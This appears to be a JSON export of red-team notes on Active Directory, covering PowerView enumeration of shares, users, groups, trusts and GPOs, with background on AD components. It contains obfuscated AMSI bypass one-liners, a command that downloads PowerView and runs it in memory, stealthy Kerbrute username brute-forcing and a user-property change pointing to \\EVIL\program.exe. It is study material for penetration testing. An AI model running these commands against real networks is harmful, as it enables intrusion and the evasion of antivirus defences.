    "content": "# Files and Shares\n\n## Find Shares on Hosts in Current Domain\n\n```powershell\nInvoke-ShareFinder -Verbose\n```\n\n## Find Shares from other Domain\n\n```powershell\nInvoke-ShareFinder -Domain lab.local\n```\n\n## Exclude Default Shares\n\n```powershell\nInvoke-ShareFinder -ExcludeStandard\n```\n\n## Show only Shares the Current User Has Access to\n\n```powershell\nInvoke-ShareFinder -CheckShareAccess\n```\n\n## Find Sensitive Files on Computers\n\n```powershell\nInvoke-FileFinder -Verbose\n```\n\n## Get All Fileservers\n\n```powershell\nGet-NetFileServer\n```\n\n## Use Alternate Credentials when Searching for Files\n\n```powershell\n# Find-InterestingDomainShareFile == old Invoke-FileFinder\n$Password = \"PASSWORD\" | ConvertTo-SecureString -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential(\"DOMAIN\\user\",$Password)\nFind-InterestingDomainShareFile -Domain Domain -Credential $Credential\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/forest_mappings",
    "path": "active_directory/enumeration/forest_mappings.md",
    "title": "Forest_mappings",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain Forest Mappings Get Details about the Current Forest `powershell AD Module Get-ADForest Get-ADForest -Identity lab.local PowerView Get-NetForest Get-NetForest -Forest lab.local ` Get All Domain...",
    "category": "active_directory",
    "content": "# Domain Forest Mappings\n\n## Get Details about the Current Forest\n\n```powershell\n# AD Module\nGet-ADForest\nGet-ADForest -Identity lab.local\n\n# PowerView\nGet-NetForest\nGet-NetForest -Forest lab.local\n```\n\n## Get All Domains in the Current Forest\n\n```powershell\n# AD Module\n(Get-ADForest).Domains\n\n# PowerView\nGet-NetForestDomain\nGet-NetForestDomain -Forest lab.local\n```\n\n## Get All Global Catalogs for the Current Forest\n\n```powershell\n# AD Module\nGet-ADForest | Select -ExpandProperty GlobalCatalogs\n\n# PowerView\nGet-NetForestCatalog\nGet-NetForestCatalog -Forest lab.local\n```\n\n## Map Trusts of a Forest\n\n```powershell\n# AD Module\nGet-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne \"$null\"'\n\n# PowerView\nGet-NetForestTrust\nGet-NetForestTrust -Forest lab.local\n```\n\n## Map All Trusts in Current Forest\n\n```powershell\n# PowerView\nGet-NetForestDomain |  Get-NetDomainTrust\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/gpos",
    "path": "active_directory/enumeration/gpos.md",
    "title": "Gpos",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain GPOs General - Security settings - Registry-based policy settings - GPP like start/shutdown/log-on/logff script settings - Software installation - Abused for privesc, backdoors, persistence Dis...",
    "category": "active_directory",
    "content": "# Domain GPOs\n\n## General\n\n- Security settings\n- Registry-based policy settings\n- GPP like start/shutdown/log-on/logff script settings\n- Software installation\n- Abused for privesc, backdoors, persistence\n\n## Display RSoP Summary Data\n\n```powershell\ngpresult /R\n\n# AD Module\nGet-GPResultantSetOfPolicy -ReportType Html -Path C:\\Users\\Administrator\\report.html\n```\n\n## Get List of GPOs in Current Domain\n\n```powershell\n# AD Module\nGet-GPO -All\n\n# PowerView\nGet-NetGPO\nGet-NetGPO | Select displayname\nGet-NetGPO -ComputerName ws01.lab.local\nGet-DomainGPO -ComputerIdentity windows1.testlab.local\n```\n\n## Get GPO(s) Which Use Restricted Groups or groups.xml for Interesting Users\n\n```powershell\nGet-NetGPOGroup\n```\n\n## Get Users Which Are in a Local Group of a Machine Using GPO\n\n```powershell\nFind-GPOComputerAdmin -ComputerName ws01.lab.local\n```\n\n## Get Machines where the given User is a Member of a Specific Group\n\n```powershell\nFind-GPOLocation -UserName user -Verbose\n```\n\n## Enumerate what Machines that a Particular User/Group Identity Has Local Admin Rights to\n\n```powershell\n# Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation\nGet-DomainGPOUserLocalGroupMapping -Identity <User/Group>\n```\n\n## Enumerate what Machines that a given User in the Specified Domain Has RDP Access Rights to\n\n```powershell\nGet-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP\n```\n\n## Export a CSV of All GPO Mappings\n\n```powershell\nGet-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join \", \"; $_} | Export-CSV -NoTypeInformation gpo_map.csv\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/groups",
    "path": "active_directory/enumeration/groups.md",
    "title": "Groups",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain Groups Get All Groups in Current Domain `powershell AD Module Get-ADGroup -Filter * | Select Name Get-ADGroup -Filter  -Properties  PowerView Get-NetGroup Get-NetGroup -FullData ` Get Informati...",
    "category": "active_directory",
    "content": "# Domain Groups\n\n## Get All Groups in Current Domain\n\n```powershell\n# AD Module\nGet-ADGroup -Filter * | Select Name\nGet-ADGroup -Filter * -Properties *\n\n# PowerView\nGet-NetGroup\nGet-NetGroup -FullData\n```\n\n## Get Information about Groups in other Domain\n\n```powershell\nGet-NetGroup -Domain lab.local\n```\n\n## Get All Groups Containing the Word \"admin\" in Group Name\n\n```powershell\n# AD Module\nGet-ADGroup -Filter 'Name -Like \"*admin*\"' | Select Name\n\n# PowerView\nGet-NetGroup \"*admin*\"\n```\n\n## Get Information about Specific Group\n\n```powershell\nGet-NetGroup -FullData \"Domain Admins\"\n```\n\n## Get All Members of Domain Admins Group\n\n```powershell\n# AD Module\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive\n\n# PowerView\nGet-NetGroupMember -GroupName \"Domain Admins\" -Recurse\n```\n\n## Get List of Enterprise Admins, only Available from Forest Root\n\n```powershell\nGet-NetGroupMember -GroupName \"Enterprise Admins\" -Domain lab.local\n```\n\n## Get Group Membership for a User\n\n```powershell\n# AD Module\nGet-ADPrincipalGroupMembership -Identity student1\n\n# PowerView\nGet-NetGroup -UserName \"student1\"\n```\n\n## List All Local Groups on a Machine (needs Administrator Privileges on Non-dc Machines)\n\n```powershell\nGet-NetLocalGroup -ComputerName dc.lab.local -ListGroups\n```\n\n## Get Members of All Local Groups on a Machine (needs Administrator Privileges on Non-dc Machines)\n\n```powershell\nGet-NetLocalGroup -ComputerName dc.lab.local -Recurse\n```\n\n## Find Linked DA Accounts Using Name Correlation\n\n```powershell\nGet-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter \"(displayname=*$a*)\" -Properties displayname,samaccountname}\n```\n\n## Find Any Machine Accounts in Privileged Groups\n\n```powershell\nGet-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}\n```\n\n## Enumerate All Groups that Don't Have a Global Scope, Returning just Group Names\n\n```powershell\nGet-DomainGroup -GroupScope NotGlobal -Properties name\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/kerbrute",
    "path": "active_directory/enumeration/kerbrute.md",
    "title": "Kerbrute",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Kerbrute Overview - Get precompiled binary for OS from https://github.com/ropnop/kerbrute/releases - Does not trigger failed log on event - Brute-force by sending only a single UDP frame to the KDC - ...",
    "category": "active_directory",
    "content": "# Kerbrute\n\n## Overview\n\n- Get precompiled binary for OS from https://github.com/ropnop/kerbrute/releases\n- Does not trigger failed log on event\n- Brute-force by sending only a single UDP frame to the KDC\n- Enumerate users on the domain from a wordlist\n\n## User Bruteforcing\n\n```bash\n# Username enumeration\nkerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/ous",
    "path": "active_directory/enumeration/ous.md",
    "title": "Ous",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain OUs Get OUs in a Domain `powershell AD Module Get-ADOrganizationalUnit -Filter  -Properties  PowerView Get-NetOU -FullData ` Get GPO Applied on an OU (Read GPOName from Gplink Attribute from Ge...",
    "category": "active_directory",
    "content": "# Domain OUs\n\n## Get OUs in a Domain\n\n```powershell\n# AD Module\nGet-ADOrganizationalUnit -Filter * -Properties *\n\n# PowerView\nGet-NetOU -FullData\n```\n\n## Get GPO Applied on an OU (Read GPOName from Gplink Attribute from Get-NetOU)\n\n```powershell\n# AD Module\nGet-GPO -GUID \"AB306569-220D-43FF-B03B-83E8F4EF8081\"\n\n# PowerView\nGet-NetGPO -GPOname \"{AB306569-220D-43FF-B03B-83E8F4EF8081}\"\n```\n\n## Find All Computers in a given OU\n\n```powershell\nGet-DomainComputer -SearchBase \"ldap://OU=...\"\n```\n\n## Get the Logged on Users for All Machines in Any *server* OU in a Particular Domain\n\n```powershell\nGet-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/powershell",
    "path": "active_directory/enumeration/powershell.md",
    "title": "Powershell",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Powershell Security Features Language Mode `powershell $ExecutionContext.SessionState.LanguageMode ` AppLocker Policy `powershell Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollection...",
    "category": "active_directory",
    "content": "# Powershell\n\n## Security Features\n\n### Language Mode\n\n```powershell\n$ExecutionContext.SessionState.LanguageMode\n```\n\n### AppLocker Policy\n\n```powershell\nGet-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections\n```\n\n### AMSI Bypasses\n\n```powershell\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n\nsET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( \"1Q2U\"  +\"zX\"  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f'amsi','d','InitFaile'  ),(  \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n## Users\n\n### Show Local Users\n\n```powershell\nGet-LocalUser\n```\n\n### Show Number of Local Users\n\n```powershell\nGet-LocalUser | Measure-Object -line\n```\n\n### Get User by providing SID\n\n```powershell\nGet-LocalUser -SID \"S-1-5-21-1394777289-3961777894-1791813945-501\"\n```\n\n### Show Usernames and SIDs\n\n```powershell\nGet-LocalUser | Select-Object -Property Name,SID,Enabled\n```\n\n### Show Users that Do not Require a Password\n\n```powershell\nGet-LocalUser | Where-Object -Property PasswordRequired -Eq $False\n```\n\n## Groups\n\n### Show Local Groups\n\n```powershell\nGet-LocalGroup\n```\n\n### Show Number of Local Groups\n\n```powershell\nGet-LocalGroup | Measure-Object -line\n```\n\n## Networks\n\n### Get Network Adapter and IP Address Information\n\n```powershell\nGet-NetIPAddress\n```\n\n### Show only IPv4 Addresses and Show Output in Table Format\n\n```powershell\nGet-NetIPAddress -AddressFamily IPv4 | Format-Table\nGet-NetIPAddress -AddressFamily IPv4 | ft\n```\n\n### Show Listening Ports\n\n```powershell\nGet-NetTCPConnection -State Listen\n```\n\n## Computers & Files\n\n### Show Installed Patches\n\n```powershell\nGet-HotFix\n```\n\n### Show Information about Specific Patch\n\n```powershell\nGet-HotFix -ID KB4023834\n```\n\n### Search for Backup Files\n\n```powershell\nGet-ChildItem -Path C:\\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force\ngci -Path C:\\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force\nls -Path C:\\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force\n```\n\n### Search for Files Containing Specific String\n\n```powershell\nGet-ChildItem C:\\* -Recurse | Select-String -pattern API_KEY\n```\n\n### Get Running Processes\n\n```powershell\nGet-Process\n```\n\n### Get All Scheduled Tasks\n\n```powershell\nGet-ScheduledTask\n```\n\n### Get Information about Specific Scheduled Task\n\n```powershell\nGet-ScheduledTask -TaskName \"new-sched-task\"\n```\n\n### Show Owner of File/Folder\n\n```powershell\nGet-ACL C:\\\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/powerview",
    "path": "active_directory/enumeration/powerview.md",
    "title": "Powerview",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Powerview Bypass AMSI `powershell If it gets blocked by AMSI we can bypass it with SeT-Item ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( TYpE )  ;    (    Get-varIABLE  ( ('1Q'+'2U')  +'zX' ...",
    "category": "active_directory",
    "content": "# Powerview\n\n## Bypass AMSI\n\n```powershell\n# If it gets blocked by AMSI we can bypass it with\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n## With Internet Access\n\n```powershell\niex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')\n```\n\n## Without Internet Access\n\n```powershell\nImport-Module .\\PowerView.ps1\n. .\\PowerView.ps1\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/trusts",
    "path": "active_directory/enumeration/trusts.md",
    "title": "Trusts",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain Trusts General - Relationship between two domains or forest - Trusted Domain Objects (TDOs) represent trust relationship in a domain - Types of trusts   - One-way: users in trusted domain can a...",
    "category": "active_directory",
    "content": "# Domain Trusts\n\n## General\n\n- Relationship between two domains or forest\n- Trusted Domain Objects (TDOs) represent trust relationship in a domain\n- Types of trusts\n  - One-way: users in trusted domain can access resources in the trusting domain\n  - Two-way trust: users of both domains can access resources in the other domain\n  - Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest)\n  - Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests)\n  - Automatic trust: created automatically when creating new subdomain (parent-child, tree-root)\n  - Shortcut trusts: used to reduce access time in complex trust scenarios\n  - External trusts: between two domains in different forests when forests do not have a turst relationships\n  - Forest trusts: between forest root domains\n\n## Get All Trusts for the Current Domain\n\n```powershell\n# AD Module\nGet-ADTrust\nGet-ADTrust -Filter * | Select Source,Target,Direction\n\n# PowerView\nGet-NetDomainTrust\n```\n\n## Get Trusts for Specific Domain\n\n```powershell\n# AD Module\nGet-ADTrust -Identity test.lab.local\n\n# PowerView\nGet-NetDomainTrust -Domain test.lab.local\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/users",
    "path": "active_directory/enumeration/users.md",
    "title": "Users",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain Users Get List of Users in Current Domain `powershell AD Module Get-ADUser -Filter  -Properties  Get-ADUser -Identity student1 -Properties * Get-ADUser -Filter  -Properties  | Select Name Power...",
    "category": "active_directory",
    "content": "# Domain Users\n\n## Get List of Users in Current Domain\n\n```powershell\n# AD Module\nGet-ADUser -Filter * -Properties *\nGet-ADUser -Identity student1 -Properties *\nGet-ADUser -Filter * -Properties * | Select Name\n\n# PowerView\nGet-NetUser\nGet-NetUser -Username student1\nGet-NetUser | Select cn\n```\n\n## Get List of All Properties for Users in Current Domain\n\n```powershell\n# AD Module\nGet-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | Select Name\nGet-ADUser -Filter * -Properties * | Select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}\n```\n\n## Find All Users with an SPN\n\n```powershell\n# PowerView\nGet-DomainUser -SPN\n```\n\n## Find All Service Accounts in \"Domain Admins\"\n\n```powershell\n# PowerView\nGet-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}\n```\n\n## Check for Users Who Don't Have Kerberos Preauthentication Set\n\n```powershell\n# PowerView\nGet-DomainUser -PreauthNotRequired\nGet-DomainUser -UACFilter DONT_REQ_PREAUTH\n```\n\n## Find Users with sidHistory Set\n\n```powershell\n# PowerView\nGet-DomainUser -LDAPFilter '(sidHistory=*)'\n```\n\n## Find Any Users with Constrained Delegation Set\n\n```powershell\n# PowerView\nGet-DomainUser -TrustedToAuth\n```\n\n## Find All Privileged Users that Aren't Marked as sensitive/not for Delegation\n\n```powershell\n# PowerView\nGet-DomainUser -AllowDelegation -AdminCount\n```\n\n## Get List of All Properties for Users in Current Domain\n\n```powershell\n# PowerView\nGet-UserProperty\nGet-UserProperty -Properties pwdlastset\n```\n\n## Search for a Particular String in a User's Attributes\n\n```powershell\n# AD Module\nGet-ADUser -Filter 'Description -Like \"*built*\"' -Properties Description | Select name,Description\n\n# PowerView\nFind-UserField -SearchField Description -SearchTerm \"built\"\n```\n\n## Get Actively Logged on Users on a Computer (needs Local Admin Rights on the target)\n\n```powershell\n# PowerView\nGet-NetLoggedOn -ComputerName dc.lab.local\n```\n\n## Get Actively Logged on Users on a Computer\n\n```powershell\n# PowerView\nGet-LoggedOnLocal -ComputerName dc.lab.local\n```\n\n## Get the Last Logged User on a Computer\n\n```powershell\n# PowerView\nGet-LastLoggedOn -ComputerName dc.lab.local\n```\n\n## Get All Users with Passwords Changed > 1 Year ago\n\n```powershell\n# PowerView\n$Date = (Get-Date).AddYears(-1).ToFileTime()\nGet-DomainUser -LDAPFilter \"(pwdlastset<=$Date)\" -Properties samaccountname,pwdlastset\n```\n\n## Get All Enabled Users\n\n```powershell\n# PowerView\nGet-DomainUser -LDAPFilter \"(!userAccountControl:1.2.840.113556.1.4.803:=2)\" -Properties distinguishedname\nGet-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname\n```\n\n## Get All Disabled Users\n\n```powershell\n# PowerView\nGet-DomainUser -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=2)\"\nGet-DomainUser -UACFilter AccountDISABLE\n```\n\n## Get All Users that Require Smart Card Authentication\n\n```powershell\n# PowerView\nGet-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=262144)\"\nGet-DomainUser -UACFilter SMARTCARD_REQUIRED\n```\n\n## Get All Users that *don't* Require Smart Card Authentication\n\n```powershell\n# PowerView\nGet-DomainUser -LDAPFilter \"(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)\" -Properties samaccountname\nGet-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname\n```\n\n## Use Multiple Identity Types for Any *-Domain* Function\n\n```powershell\n# PowerView\n'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff\n```\n\n## Enumerate All Foreign Users in the Global Catalog, and Query the Specified Domain Localgroups for Their Memberships\n\n```powershell\n# PowerView\n\n# query the global catalog for foreign security principals with Domain-based SIDs, and extract out all distinguishednames\n$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \"GC://testlab.local\" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\\d{2,}$'} | Select-Object -ExpandProperty distinguishedname\n$Domains = @{}\n$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {\n    # extract the Domain the foreign User was added to\n    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n    # check if we've already enumerated this Domain\n    if (-not $Domains[$ForeignUserDomain]) {\n        $Domains[$ForeignUserDomain] = $True\n        # enumerate all Domain local groups from the given Domain that have membership set with our foreignSecurityPrincipal set\n        $Filter = \"(|(member=\" + $($ForeignUsers -join \")(member=\") + \"))\"\n        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member\n    }\n}\n$ForeignMemberships | fl\n```\n\n## If Running in -sta Mode, Impersonate Another Credential a la \"runas /netonly\"\n\n```powershell\n# PowerView\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nInvoke-UserImpersonation -Credential $Cred\n# ... action\nInvoke-RevertToSelf\n```\n\n## Set the Specified Property for the given User Identity\n\n```powershell\n# PowerView\nSet-DomainObject testuser -Set @{'mstsinitialprogram'='\\\\EVIL\\program.exe'} -Verbose\n```\n\n## Set the Owner of 'dfm' in the Current Domain to 'bufu'\n\n```powershell\n# PowerView\nSet-DomainObjectOwner -Identity dfm -OwnerIdentity bufu\n```\n\n## Retrieve *most* Users Who Can Perform DC Replication for dev.testlab.local (i.e. DCsync)\n\n```powershell\n# PowerView\nGet-ObjectACL \"DC=testlab,DC=local\" -ResolveGUIDs | ? {\n    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')\n}\n```\n\n## Check if Any User Passwords Are Set\n\n```powershell\n# PowerView\n$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' \"$([System.Text.Encoding]::ASCII.GetString($_.userPassword))\" -PassThru} | fl\n```\n\n## User Hunting with PowerView\n\n### Find All Machines on the Current Domain where the Current User Has Local Admin Access\n\nThis function queries the DC of the current or provided Domain for a list of Computers (`Get-NetComputer`) and then use multi-threaded ``Invoke-CheckLocalAdminAccess`` on each machine.\n\nCan also be done using WMI and PowerShell Remoting, see ``Find-WMILocalAdminAccess.ps1`` and ``Find-PSRemotingLocalAdminAccess.ps1``.\n\n```powershell\nFind-LocalAdminAccess -Verbose\n```\n\n### Find Local Admins on All Machines\n\nNeeds administrator privs on non-dc machines.\n\nThis function queries the DC of the current or provided Domain for a list of Computers (``Get-NetComputer``) and then use multi-threaded ``Get-NetLocalGroup`` on each machine.\n\n```powershell\nInvoke-EnumerateLocalAdmin -Verbose\n```\n\n### Find Computers where a Domain Admin (or Specified User/group) Has Sessions\n\nThis function queries the DC of the current or provided Domain for members of the given group (Domain Admins by default) using ``Get-NetGroupMember``, gets a list of Computers (``Get-NetComputer``) and list sessions and logged on Users (``Get-NetSession`` / ``Get-NetLoggedon``) from each one.\n\n```powershell\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\n```\n\n### Confirm Admin Access\n\n```powershell\nInvoke-UserHunter -CheckAccess\n```\n\n### Find Computers where a Domain Admin is Logged-in\n\nThis option queries the DC of the current or provided Domain for members of the given group (Domain Admins by default) using ``Get-NetGroupMember``, gets a list *only* of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on Users (``Get-NetSession`` / ``Get-NetLoggedon``) from each machine.\n\n```powershell\nInvoke-UserHunter -Stealth\n```\n\n### Enumerate Servers that Allow Unconstrained Delegation and Show All Logged in Users\n\n``Find-DomainUserLocation`` == old ``Invoke-UserHunter``\n\n```powershell\nFind-DomainUserLocation -ComputerUnconstrained -ShowAll\n```\n\n### Hunt for Admin Users that Allow Delegation, Logged into Servers that Allow Unconstrained Delegation\n\n```powershell\nFind-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation\n```\n\n### Defending against User Hunting\n\n#### NetCease\n\n- Script to change permissions on `NetSessionEnum` method by removing permissions for `Authenticated Users` group\n- Fails many of the attacker's session enumeration and hence User hunting capabilities\n\n```powershell\n.\\NetCease.ps1\n```\n\n#### SAMRi10\n\n- From same author as NetCease\n- Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)\n- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/general/README",
    "path": "active_directory/general/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "General",
    "category": "active_directory",
    "content": "# General\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/general/dns",
    "path": "active_directory/general/dns.md",
    "title": "Dns",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Dns General - Active Directory relies on DNS - Locate machines and resources on the same domain Setup DNS `powershell Install normal DNS server Install-WindowsFeature DNS Register DNS records cmd /c i...",
    "category": "active_directory",
    "content": "# Dns\n\n## General\n\n- Active Directory relies on DNS\n- Locate machines and resources on the same domain\n\n## Setup DNS\n\n```powershell\n# Install normal DNS server\nInstall-WindowsFeature DNS\n\n# Register DNS records\ncmd /c ipconfig -registerdns\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/general/general",
    "path": "active_directory/general/general.md",
    "title": "General",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "General Introduction - Used to manage Windows domain networks - \"Phone book\" for Windows -> stores information about computers, users, etc. - Authentication uses Kerberos tickets - Can be exploited us...",
    "category": "active_directory",
    "content": "# General\n\n## Introduction\n\n- Used to manage Windows domain networks\n- \"Phone book\" for Windows -> stores information about computers, users, etc.\n- Authentication uses Kerberos tickets\n- Can be exploited using intended functionality\n\n## Physical AD Components\n\n- Domain controller server -> AD DS server role installed\n- Domain controllers\n  - Host copy of AD DS directory store\n  - Provides authentication & authorization\n  - Replicate updates to other DCs in the domain and forest\n  - Administrative access to manage user accounts and network resources\n- AD DS data store\n  - Contains db files and processes that store and manage directory information for users, services, and applications\n  - Consists of the `Ntds.dit` file\n  - Is stored by default in the `%SystemRoot%\\NTDS` folder on all DCs\n  - Accessible only through the DC processes and protocols\n\n## Logical AD Components\n\n- AD DS schema\n- Every type of object that can be stored\n- Enforces rules for object creation & configuration\n\n| Object Types | Function | Examples |\n| --- | --- | --- |\n| Class Object | What objects can be created in the directory | User, Computer |\n| Attribute Object | Information that can be attached to an object | Display name |\n\n### Domains\n\n- Used to group and manage objects in an organization\n- Administartive boundary for applying policies to groups and objects\n- Replication boundary for replicating data between domain controllers\n- Authentication & authorization boundary that provides a way to limit the scope of access to resources\n  \n\n### Trees\n\n- Hierarchy of domains in AD DS\n- All domains in the tree\n  - Share contiguous namepsace with parent domain\n  - Can have additional child domains\n  - By default create a two-way transitive trust with other domains\n\n### Forest\n\n- Collection of one or more domain trees\n- Share a common\n  - schema\n  - configuration partition\n  - global catalog to enable searching\n- Enable trusts between all domains in the forest\n- Share the Enterprise Admins and Schema Admins groups\n\n### Organization Units (OUs)\n\n- AD containers that can contain users, groups, computer and other OUs\n- Used to\n  - Represent organization hierarchically and logically\n  - Manage a collection of objects in a consistent way\n  - Delegate permissions to administer groups of objects\n  - Apply policies\n- Separate components only for applying GP\n- Don't mix users and computers\n\n### Trusts\n\n- Provide mecahnism for users to gain access to resources in antoher domain\n- All domains in a forest trust all other domains in the forest\n- Can extend outside the forest\n- Types of trusts\n  - Directional\n  - Transitive\n  \n\n### Objects\n\n- User\n- InetOrgPerson\n- Contacts\n- Groups\n- Computers\n- Printers\n- Shared folders\n\n### Flexible Single Master Operations (FSMO) Roles\n\n#### Schema Master\n\n- Performs updates to the AD schema such as ADPREP/FORESTPREP, MS Exchange\n- Must be online during schema updates\n- Generally placed on the forest root PDC\n\n#### Domain Naming Master\n\n- Adds and removes domains and application partitions to and from the AD forest\n- Must be online when domains and application partitions in a forest are added or removed\n- Generally placed on the forest root PDC\n\n#### PDC Emulator\n\n- Manages password changes for computer and user accounts on replica domain controllers\n- Consulted by replica domain controllers where service authentication requests have mismatched passwords\n- Target DC for Group Policy updates\n- Usually also the single authorative time server\n- Target DC for legacy applications that perform writable operations and for some admin tools\n- Must be online and accessible at all times\n- Generally placed on higher-performance hardware in a reliable hub site alongside other DCs\n\n#### RID Master\n\nAllocates active and standby RID pools to replica DCs in the same domain\nMust be online for newly-promoted DCs to obtain a local RID pool or when existing DCs must update their current or standby RID pool allocation\nGenerally placed on the forest root PDC\n\n#### Infrastructure Master\n\n- Updates cross-domain references and phantoms/tombstones from the Global Catalog\n- A Separate infrastructure master is created for each application partition including the default forest-wide and domain-wide application partitions\n- Can be placed on any DC in single-domain forest\n- Generally placed on a DC that is not a Global Catalog in a multi-domain forest except when all DCs in the forest are Global Catalog then it can be placed on any DC\n",
